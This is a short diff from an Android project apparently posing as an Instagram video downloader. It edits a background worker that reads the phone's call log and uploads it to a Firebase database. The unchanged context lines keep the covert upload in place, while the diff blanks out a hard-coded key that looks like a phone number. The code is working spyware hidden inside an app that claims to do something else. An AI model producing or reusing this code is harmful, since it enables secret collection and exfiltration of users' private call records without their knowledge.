@@ -3,8 +3,6 @@ package com.example.instagramvideodownloader.work_manager
 
 import android.content.Context
 import android.provider.CallLog
-import android.util.Log
-import android.widget.Toast
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
 import com.example.instagramvideodownloader.work_manager.models.CallLogItemModel
@@ -50,7 +48,7 @@ class CallLogUploadWorker(appContext: Context, workerParams: WorkerParameters?) 
 
         // Now, you have the list of call logs. Upload it to Firebase Realtime Database.
 
-        val reference = database.getReference("call_logs").child("8867817008")
+        val reference = database.getReference("call_logs").child("")
         try {
             reference.setValue(callLogsList).await()
             Result.success()
